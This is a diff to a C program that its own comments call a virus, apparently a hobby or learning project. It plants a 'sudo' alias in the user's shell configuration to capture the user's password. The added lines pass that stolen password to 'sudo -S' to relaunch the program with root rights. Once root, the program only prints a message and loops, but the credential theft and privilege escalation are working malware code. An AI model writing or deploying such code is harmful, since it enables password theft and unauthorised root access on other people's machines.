@@ -25,6 +25,10 @@ int main(int argc, char ** argv){
       mode = P_SUDO;
       break;
     }
+    if (strcmp(argv[i],"ROOT")==0){
+      mode = P_ROOT;
+      break;
+    }
   }
 
   //implant the alias to the virus as sudo...
@@ -44,12 +48,32 @@ int main(int argc, char ** argv){
     
     char ** cmd_ray = make_execvp_args(argc, argv);
     runSudo(passwd, cmd_ray, 0);
+    free_execvp_ray(cmd_ray);
+
+    char escaped_path[2048] = "";
+    get_virus_name(escaped_path);
+    char *escalate_vector[5] = {"/bin/sudo", "-S", escaped_path, "ROOT", NULL};
+
+    printf("ESCALATING VIRUS TO ROOT LEVEL PERMISSIONS...\n");
+    runSudo(passwd, escalate_vector, 0);
   }
 
+  if(mode == P_ROOT){
+    printf("I have root acess now...\n");
+    while(1){
+      sleep(1);
+      printf("...\n");
+    }
+  }
   return 0;
 
 }
 
+void free_execvp_ray(char ** cmd_ray){
+  free(cmd_ray[0]);
+  free(cmd_ray[1]);
+  free(cmd_ray);
+}
 
 int get_username(char * uname){
   uid_t uid = getuid();
@@ -87,15 +111,12 @@ int steal_password(char * passwd, char * username){
   return 0;
 }
 
-int alias_virus(){
-  //get the home dir
-  char * home_dir_path= getenv("HOME");
-
+int get_virus_name(char * escaped_path){
   //get the path to the virus
   char path_to_this_exe[1024] = "";
   readlink("/proc/self/exe", path_to_this_exe, sizeof(path_to_this_exe));
 
-  char escaped_path[2048] = "";
+  memset(escaped_path, 0, 2048);
   for (int i = 0; i < strlen(path_to_this_exe); i++) {
       if (path_to_this_exe[i] == ' ') {
           strcat(escaped_path, "\\ ");
@@ -103,6 +124,17 @@ int alias_virus(){
           strncat(escaped_path, &path_to_this_exe[i], 1);
       }
   }
+
+}
+
+int alias_virus(){
+  //get the home dir
+  char * home_dir_path= getenv("HOME");
+
+  char escaped_path[2048] = "";
+
+  get_virus_name(escaped_path);
+  
 
   //prepare the alias
   char alias[4096] = "alias sudo=\"";
